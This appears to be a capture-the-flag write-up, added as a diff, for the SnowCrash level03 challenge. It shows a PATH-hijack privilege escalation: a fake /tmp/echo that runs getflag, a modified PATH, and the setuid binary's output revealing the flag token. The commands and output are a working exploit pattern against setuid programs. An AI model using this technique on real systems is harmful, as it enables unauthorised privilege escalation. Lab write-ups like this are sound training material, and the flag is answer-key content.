@@ -1,0 +1,47 @@
+As always we first ls -la to see what is all given to us and the permissions that is given with it
+level03@SnowCrash:~$ ls -la
+total 24
+dr-x------ 1 level03 level03  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+we see that we have an executable. we will run it and see what happens 
+evel03@SnowCrash:~$ ./level03 
+Exploit me
+
+we see that it prints out 'Exploit me'.
+So now we will do just that.
+
+if we look at the executable level03 in terms of what `strings` uses. We can see that the binary use `/usr/bin/env 
+		echo 'Exploit me' to print Exploit me we can change the location of echo with a fake one that will provide use
+		with the command getflag, because ./level03 does have the right of flag03 user
+
+ using this exploit :
+ we see that there os a getflag command
+level03@SnowCrash:~$ echo '/bin/get
+getfacl           getflag           get_mountoptions  
+ level03@SnowCrash:~$ ls -la /bin/getflag
+-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag  #Has the following rights
+
+So we will make our own echo
+ echo '/bin/getflag' > /tmp/echo;
+
+ Now we have to give rights to the echo we made
+ chmod +x /tmp/echo;
+level03@SnowCrash:~$ ls -la /tmp/echo
+-rwxrwxr-x 1 level03 level03 13 Oct 23 13:06 /tmp/echo #Now has Full rights to make it executable
+
+We have to change the PATH now to out PATH we want
+export PATH=/tmp:$PATH;
+
+run the executable now and you get
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+further read
+https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail
+https://isc.sans.edu/forums/diary/Shellshock+A+Collection+of+Exploits+seen+in+the+wild/18725/
